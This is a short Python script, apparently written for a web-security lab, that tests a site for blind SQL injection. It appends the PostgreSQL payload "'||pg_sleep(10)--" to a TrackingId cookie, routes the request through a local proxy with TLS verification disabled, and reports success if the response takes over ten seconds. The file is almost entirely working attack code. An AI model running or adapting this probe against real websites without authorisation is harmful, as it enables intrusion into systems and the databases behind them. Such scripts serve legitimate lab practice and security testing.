import urllib3
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def blindsqlinjectionwithtimedelays(url):
  #print(response.elapsed.total_seconds())
  uri = '/'
  fullurl = url + uri
  payload = "'||pg_sleep(10)--"
  cookie = {
      'TrackingId':'es911oZooGlAlPTA' + payload,
      'session': '4nBxnyWPPmsI5jtjxdXZgO5htybe5rPG'
  }
  r = requests.get(fullurl, verify=False, proxies=proxies, cookies=cookie)
  if r.elapsed.total_seconds() > 10 :
      print("Blind SQL Injection with time delay successful")
  else:
      print("Blind SQL Injection with time delay not successful")
      
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage python3 %s <url>' %sys.argv[0])
        print('[-] Example python3 %s example.com' %sys.argv[0])

    blindsqlinjectionwithtimedelays(url)
